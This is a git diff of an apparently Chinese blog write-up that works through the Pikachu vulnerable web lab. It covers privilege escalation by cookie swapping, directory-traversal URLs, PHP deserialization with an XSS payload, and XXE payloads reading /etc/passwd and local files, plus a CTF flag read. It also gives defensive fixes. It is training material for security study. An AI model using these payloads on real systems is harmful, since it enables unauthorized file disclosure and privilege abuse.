@@ -517,21 +517,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2020-07-12
+                    2020-07-17
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    5.4k
+                    9.7k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    20 分
+                    37 分
                 </div>
                 
 				
@@ -951,7 +951,366 @@ system(&quot;whoami&quot;);</code></pre><p><img src="https://i.loli.net/2020/05/
 <h3 id="垂直越权"><a href="#垂直越权" class="headerlink" title="垂直越权"></a>垂直越权</h3><blockquote>
 <p>A用户权限高于B用户，B用户越权操作A用户的权限的情况称为垂直越权。</p>
 </blockquote>
-<h2 id="Directory-Traversal（目录遍历）"><a href="#Directory-Traversal（目录遍历）" class="headerlink" title="Directory Traversal（目录遍历）"></a>Directory Traversal（目录遍历）</h2><h2 id="赞助💰"><a href="#赞助💰" class="headerlink" title="赞助💰"></a>赞助💰</h2><p>如果你觉得对你有帮助，你可以赞助我一杯冰可乐！嘻嘻🤭</p>
+<p>1、点击右上角的提示，存在两个用户，【admin/123456,pikachu/000000,admin是超级boss】</p>
+<p>2、登录超级用户admin，可以查看所有用户信息，并且可以创建新用户</p>
+<p>3、点击添加用户，输入jwt用户信息，然后打开Burp，进行抓包，发现Cookie中有PHPSESSID，再发送到<code>repeater</code>，进行发包，成功添加新用户jwt</p>
+<p>4、登录普通用户pikachu，只有查看用户信息的权限；然后使用Burp抓取其登录态的Cookie，将Cookie复制到上面超级管理员登录时的Cookie位置,最后点击<code>Go</code></p>
+<p>5、刷新页面,看到创建了两个jwt用户，第一个是admin创建的，第二个是pikachu创建的，普通用户pikachu也成功创建用户，这就实现了垂直越权</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jwt1399/cdn//img/20200713140917.png" alt></p>
+<p><strong>源码分析</strong></p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">//目录结构</span>
+op2_admin<span class="token punctuation">.</span>php
+op2_admin_edit<span class="token punctuation">.</span>php
+op2_login<span class="token punctuation">.</span>php
+op2_user<span class="token punctuation">.</span>php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>有一个<code>op2_login.php</code>，进行登录判断，如果级别是1，进入<code>op2_admin.php</code>；如果级别是2，进入<code>op2_user.php</code>，登入admin用户界面，有个<code>admin_edit.php</code>页面，可以添加新用户，但是添加新用户时，只是验证了登录状态，并没有验证级别，所以存在越权问题。</p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">//admin_edit.php 22-25行</span>
+<span class="token comment" spellcheck="true">// 判断是否登录，没有登录不能访问</span>
+<span class="token comment" spellcheck="true">//这里只是验证了登录状态，并没有验证级别，所以存在越权问题。</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">check_op2_login</span><span class="token punctuation">(</span><span class="token variable">$link</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"location:op2_login.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="CTF例子"><a href="#CTF例子" class="headerlink" title="CTF例子"></a>CTF例子</h3><p><a href="https://blog.csdn.net/jiyi_guoshu/article/details/88544274" target="_blank" rel="noopener">NKCTF-web（记一次越权）</a></p>
+<h2 id="Directory-Traversal（目录遍历）"><a href="#Directory-Traversal（目录遍历）" class="headerlink" title="Directory Traversal（目录遍历）"></a>Directory Traversal（目录遍历）</h2><blockquote>
+<p>在web功能设计中,很多时候我们会要将需要访问的文件定义成变量，从而让前端的功能便的更加灵活。 当用户发起一个前端的请求时，便会将请求的这个文件的值(比如文件名称)传递到后台，后台再执行其对应的文件。 在这个过程中，如果后台没有对前端传进来的值进行严格的安全考虑，则攻击者可能会通过“../”这样的手段让后台打开或者执行一些其他的文件。 从而导致后台服务器上其他目录的文件结果被遍历出来，形成目录遍历漏洞。</p>
+<p>看到这里,你可能会觉得目录遍历漏洞和不安全的文件下载，甚至文件包含漏洞有差不多的意思，是的，目录遍历漏洞形成的最主要的原因跟这两者一样，都是在功能设计中将要操作的文件使用变量的方式传递给了后台，而又没有进行严格的安全考虑而造成的，只是出现的位置所展现的现象不一样，因此，这里还是单独拿出来定义一下。</p>
+<p>需要区分一下的是,如果你通过不带参数的url（比如：<a href="http://xxxx/doc）列出了doc文件夹里面所有的文件，这种情况，我们成为敏感信息泄露，而并不归为目录遍历漏洞。" target="_blank" rel="noopener">http://xxxx/doc）列出了doc文件夹里面所有的文件，这种情况，我们成为敏感信息泄露，而并不归为目录遍历漏洞。</a></p>
+</blockquote>
+<p>随意点击页面，得到跳转链接。</p>
+<pre><code>http://127.0.0.1/pikachu-master/vul/dir/dir_list.php?title=truman.php</code></pre><p>可以看到<code>URL</code>中有文件名，那我们可以进行构造，实现目录遍历</p>
+<pre><code>?title=../../../../phpinfo.php
+?title=../../../../Windows/win.ini
+
+去掉url中的参数，列出了dir文件夹里面所有的文件，这种情景称为敏感信息泄露，而并不归为目录遍历漏洞。
+http://127.0.0.1/pikachu-master/vul/dir/</code></pre><p><strong>源码分析</strong></p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$html</span><span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'title'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token variable">$filename</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'title'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token comment" spellcheck="true">//这里直接把传进来的内容进行了require(),造成问题</span>
+    <span class="token keyword">require</span> <span class="token string">"soup/$filename"</span><span class="token punctuation">;</span>
+<span class="token comment" spellcheck="true">//    echo $html;</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><strong>修复</strong></p>
+<p>白名单或者过滤用户输入，比如过滤<code>../</code></p>
+<h2 id="敏感信息泄露"><a href="#敏感信息泄露" class="headerlink" title="敏感信息泄露"></a>敏感信息泄露</h2><blockquote>
+<p>由于后台人员的疏忽或者不当的设计，导致不应该被前端用户看到的数据被轻易的访问到。 比如：<br>—通过访问url下的目录，可以直接列出目录下的文件列表;<br>—输入错误的url参数后报错信息里面包含操作系统、中间件、开发语言的版本或其他信息;<br>—前端的源码（html,css,js）里面包含了敏感信息，比如后台登录地址、内网接口信息、甚至账号密码等;</p>
+<p>类似以上这些情况，我称为敏感信息泄露。</p>
+</blockquote>
+<p>1.打开界面是一个登陆页面，查看源码发现敏感信息</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jwt1399/cdn//img/20200714090924.png" alt></p>
+<p>2.登陆之后发现abc.php</p>
+<p>3.不登录直接将findabc.php改为abc.php也可访问</p>
+<h2 id="PHP反序列化"><a href="#PHP反序列化" class="headerlink" title="PHP反序列化"></a>PHP反序列化</h2><p>在理解这个漏洞前,你需要先搞清楚php中serialize()，unserialize()这两个函数。</p>
+<p><strong>序列化serialize()</strong><br>序列化说通俗点就是把一个对象变成可以传输的字符串,比如下面是一个对象:</p>
+<pre class="line-numbers language-php"><code class="language-php">    <span class="token keyword">class</span> <span class="token class-name">S</span><span class="token punctuation">{</span>
+        <span class="token keyword">public</span> <span class="token variable">$test</span><span class="token operator">=</span><span class="token string">"pikachu"</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    <span class="token variable">$s</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">S</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//创建一个对象</span>
+    <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//把这个对象进行序列化</span>
+    序列化后得到的结果是这个样子的<span class="token punctuation">:</span>O<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string">"S"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"test"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">7</span><span class="token punctuation">:</span><span class="token string">"pikachu"</span><span class="token punctuation">;</span><span class="token punctuation">}</span>
+        O<span class="token punctuation">:</span>代表object
+        <span class="token number">1</span><span class="token punctuation">:</span>代表对象名字长度为一个字符
+        S<span class="token punctuation">:</span>对象的名称
+        <span class="token number">1</span><span class="token punctuation">:</span>代表对象里面有一个变量
+        s<span class="token punctuation">:</span>数据类型
+        <span class="token number">4</span><span class="token punctuation">:</span>变量名称的长度
+        test<span class="token punctuation">:</span>变量名称
+        s<span class="token punctuation">:</span>数据类型
+        <span class="token number">7</span><span class="token punctuation">:</span>变量值的长度
+        pikachu<span class="token punctuation">:</span>变量值<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><strong>反序列化unserialize()</strong></p>
+<p>就是把被序列化的字符串还原为对象,然后在接下来的代码中继续使用。</p>
+<pre class="line-numbers language-php"><code class="language-php">    <span class="token variable">$u</span><span class="token operator">=</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token string">"O:1:"</span>S<span class="token string">":1:{s:4:"</span>test<span class="token string">";s:7:"</span>pikachu<span class="token string">";}"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">echo</span> <span class="token variable">$u</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">test</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//得到的结果为pikachu</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>序列化和反序列化本身没有问题,但是如果反序列化的内容是用户可以控制的,且后台不正当的使用了PHP中的魔法函数,就会导致安全问题</p>
+<pre class="line-numbers language-php"><code class="language-php">        常见的几个魔法函数<span class="token punctuation">:</span>
+        <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>当一个对象创建时被调用
+
+        <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>当一个对象销毁时被调用
+
+        <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>当一个对象被当作一个字符串使用
+
+        <span class="token function">__sleep</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 在对象在被序列化之前运行
+
+        __wakeup将在序列化之后立即被调用
+
+        漏洞举例<span class="token punctuation">:</span>定义一个类，写一个<span class="token keyword">function</span>，这个<span class="token keyword">function</span>直接使用了魔法方法
+        <span class="token keyword">class</span> <span class="token class-name">S</span><span class="token punctuation">{</span>
+            <span class="token keyword">var</span> <span class="token variable">$test</span> <span class="token operator">=</span> <span class="token string">"pikachu"</span><span class="token punctuation">;</span>
+            <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+                <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">test</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span>
+        <span class="token punctuation">}</span>
+        <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'test'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+        @<span class="token variable">$unser</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        payload<span class="token punctuation">:</span>O<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string">"S"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"test"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">29</span><span class="token punctuation">:</span><span class="token string">"&lt;script>alert('xss')&lt;/script>"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><strong>源码分析</strong></p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">S</span><span class="token punctuation">{</span>
+    <span class="token keyword">var</span> <span class="token variable">$test</span> <span class="token operator">=</span> <span class="token string">"pikachu"</span><span class="token punctuation">;</span>
+    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">test</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+
+
+<span class="token comment" spellcheck="true">//O:1:"S":1:{s:4:"test";s:29:"</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">)</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span>"<span class="token punctuation">;</span><span class="token punctuation">}</span>
+<span class="token variable">$html</span><span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'o'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'o'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>@<span class="token variable">$unser</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+        <span class="token variable">$html</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token string">"&lt;p>大兄弟,来点劲爆点儿的!&lt;/p>"</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
+        <span class="token variable">$html</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token string">"&lt;p>{$unser->test}&lt;/p>"</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>没有对用户传进来的参数做过滤，直接反序列化。</p>
+<p>利用相似的代码生成一个反序列化的字符串</p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token keyword">class</span> <span class="token class-name">S</span><span class="token punctuation">{</span>
+    <span class="token keyword">var</span> <span class="token variable">$test</span> <span class="token operator">=</span> <span class="token string">"&lt;script>alert('xss')&lt;/script>"</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">S</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="https://cdn.jsdelivr.net/gh/jwt1399/cdn//img/20200715113815.png" alt></p>
+<p>提交payload:<code>O:1:&quot;S&quot;:1:{s:4:&quot;test&quot;;s:29:&quot;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&quot;;}</code></p>
+<p>反序列化的结果是一个 JS 的弹窗，我们提交后就能进行 XSS 攻击</p>
+<h2 id="XXE（外部实体注入攻击）"><a href="#XXE（外部实体注入攻击）" class="headerlink" title="XXE（外部实体注入攻击）"></a>XXE（外部实体注入攻击）</h2><h3 id="基础知识准备-2"><a href="#基础知识准备-2" class="headerlink" title="基础知识准备"></a>基础知识准备</h3><blockquote>
+<p>XXE -“xml external entity injection” 即”xml外部实体注入漏洞”。<br>概括一下就是”攻击者通过向服务器注入指定的xml实体内容,从而让服务器按照指定的配置进行执行,导致问题”<br>也就是说服务端接收和解析了来自用户端的xml数据,而又没有做严格的安全控制,从而导致xml外部实体注入。<br>现在很多语言里面对应的解析xml的函数默认是禁止解析外部实体内容的,从而也就直接避免了这个漏洞。<br>以PHP为例,在PHP里面解析xml用的是libxml,其在≥2.9.0的版本中,默认是禁止解析xml外部实体内容的。</p>
+<p>本章提供的案例中,为了模拟漏洞,通过手动指定LIBXML_NOENT选项开启了xml外部实体解析。</p>
+</blockquote>
+<p>XML是可扩展的标记语言（E<code>X</code>tensible <code>M</code>arkup <code>L</code>anguage），设计用来进行数据的传输和存储， 结构是树形结构，由标签构成，这点很像HTML语言。但是XML和HTML有明显区别如下：</p>
+<pre><code>XML 被设计用来传输和存储数据，其焦点是数据的内容。
+HTML 被设计用来显示数据，其焦点是数据的外观。</code></pre><p>XML语法结构大致如下</p>
+<pre class="line-numbers language-xml"><code class="language-xml">第一部分：XML声明部分
+<span class="token prolog">&lt;?xml version="1.0"?></span>
+
+第二部分：文档类型定义 DTD
+&lt;!DOCTYPE note[ 
+<span class="token comment" spellcheck="true">&lt;!--定义此文档是note类型的文档--></span>
+&lt;!ENTITY entity-name SYSTEM "URI/URL">
+<span class="token comment" spellcheck="true">&lt;!--外部实体声明--></span>
+]>
+
+第三部分：文档元素
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>note</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>to</span><span class="token punctuation">></span></span>Dave<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>to</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>from</span><span class="token punctuation">></span></span>Tom<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>from</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>Reminder<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>You are a good man<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>note</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>DTD（Document Type Definition，文档类型定义），用来为 XML 文档定义语法约束，可以是内部申明也可以使引用外部DTD，现在很多语言里面对应的解析xml的函数默认是禁止解析外部实体内容的，从而也就直接避免了这个漏洞。</p>
+<pre class="line-numbers language-xml"><code class="language-xml">① 内部申明DTD格式
+<span class="token doctype">&lt;!DOCTYPE 根元素 [元素申明]></span>
+
+② 外部引用DTD格式
+<span class="token doctype">&lt;!DOCTYPE 根元素 SYSTEM "外部DTD的URI"></span>
+
+③ 引用公共DTD格式
+<span class="token doctype">&lt;!DOCTYPE 根元素 PUBLIC "DTD标识名" "公共DTD的URI"></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="Pikachu-1"><a href="#Pikachu-1" class="headerlink" title="Pikachu"></a>Pikachu</h3><p><strong>内部实体引用 Payload</strong></p>
+<pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version = "1.0"?></span>
+<span class="token doctype">&lt;!DOCTYPE note [
+    &lt;!ENTITY hacker "hihihi"></span>
+]>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span><span class="token entity" title="&hacker;">&amp;hacker;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>如果用构造的<code>payload</code>始终无法成功，修改一哈PhpStudy的php版本即可</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jwt1399/cdn//img/20200715113809.png" alt></p>
+<p><strong>外部实体引用 Payload</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/jwt1399/cdn//img/20200715114611.png" alt="外部引用支持的协议"></p>
+<p>在D盘下新建一个jwt.txt,内容为hahaha,作为我们要读取的文件</p>
+<p><strong>使用file协议读取</strong></p>
+<pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0"  encoding="UTF-8"?></span>
+<span class="token doctype">&lt;!DOCTYPE name [
+&lt;!ENTITY f SYSTEM "file:///D://jwt.txt"></span>]>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span><span class="token entity" title="&f;">&amp;f;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="https://cdn.jsdelivr.net/gh/jwt1399/cdn//img/20200715115834.png" alt></p>
+<p><strong>使用php协议读取</strong></p>
+<pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version = "1.0"?></span>
+<span class="token doctype">&lt;!DOCTYPE ANY [
+    &lt;!ENTITY f SYSTEM "php://filter/read=convert.base64-encode/resource=D://jwt.txt"></span>
+]>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x</span><span class="token punctuation">></span></span><span class="token entity" title="&f;">&amp;f;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="https://cdn.jsdelivr.net/gh/jwt1399/cdn//img/20200715120128.png" alt></p>
+<p><strong>Linux下读取</strong></p>
+<pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0"?></span>
+<span class="token doctype">&lt;!DOCTYPE ANY[ 
+&lt;!ENTITY f SYSTEM "file:///etc/passwd"></span>
+]>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x</span><span class="token punctuation">></span></span><span class="token entity" title="&f;">&amp;f;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><strong>源码分析</strong></p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$html</span><span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'xml'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token variable">$xml</span> <span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'xml'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token variable">$data</span> <span class="token operator">=</span> @<span class="token function">simplexml_load_string</span><span class="token punctuation">(</span><span class="token variable">$xml</span><span class="token punctuation">,</span><span class="token string">'SimpleXMLElement'</span><span class="token punctuation">,</span><span class="token constant">LIBXML_NOENT</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//添加了LIBXML_NOENT参数开启了外部实体解析</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+        <span class="token variable">$html</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token string">"&lt;pre>{$data}&lt;/pre>"</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
+        <span class="token variable">$html</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token string">"&lt;p>XML声明、DTD文档类型定义、文档元素这些都搞懂了吗?&lt;/p>"</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>如果一个接口支持接收XML数据，且没有对XML数据做任何安全上的措施，就可能导致XXE漏洞。</p>
+<p>simplexml_load_string()函数转换形式良好的XML字符串为SimpleXMLElement对象。</p>
+<p><strong>XXE漏洞防御</strong><br>方案：使用开发语言提供的禁用外部实体的方法<br>1.PHP：</p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token function">libxml_disable_entity_loader</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>2.JAVA：</p>
+<pre class="line-numbers language-java"><code class="language-java">DocumentBuilderFactory dbf <span class="token operator">=</span>DocumentBuilderFactory<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+dbf<span class="token punctuation">.</span><span class="token function">setExpandEntityReferences</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>3.Python：</p>
+<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> lxml <span class="token keyword">import</span> etree
+xmlData <span class="token operator">=</span> etree<span class="token punctuation">.</span>parse<span class="token punctuation">(</span>xmlSource<span class="token punctuation">,</span>etree<span class="token punctuation">.</span>XMLParser<span class="token punctuation">(</span>resolve_entities<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<h3 id="CTF实例"><a href="#CTF实例" class="headerlink" title="CTF实例"></a>CTF实例</h3><h4 id="题目-Jarvis-OJ–api调用"><a href="#题目-Jarvis-OJ–api调用" class="headerlink" title="题目 Jarvis OJ–api调用"></a>题目 Jarvis OJ–api调用</h4><p>题目地址：<a href="http://web.jarvisoj.com:9882/" target="_blank" rel="noopener">http://web.jarvisoj.com:9882/</a></p>
+<p>解题思路:</p>
+<p>XXE漏洞就是服务器接受从客户端发送来的xml格式数据时，xml数据中恶意的引用了外部实体，将它的值绑定为服务器的目标文件，这样在服务器返回给我们解析后的值时，就会把目标文件的内容返回给我们，我们就读取了敏感文件。</p>
+<p>这道题目，默认的是json格式传递，因此首先我们更改<code>Content-Type</code>的值为<code>application/xml</code>,然后传入xml代码：</p>
+<p><strong>Payload</strong></p>
+<pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0"?></span>
+<span class="token doctype">&lt;!DOCTYPE ANY[ 
+&lt;!ENTITY f SYSTEM "file:///home/ctf/flag.txt"></span>
+]>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x</span><span class="token punctuation">></span></span><span class="token entity" title="&f;">&amp;f;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="https://cdn.jsdelivr.net/gh/jwt1399/cdn//img/20200715165006.png" alt></p>
+<h2 id="URL重定向"><a href="#URL重定向" class="headerlink" title="URL重定向"></a>URL重定向</h2><blockquote>
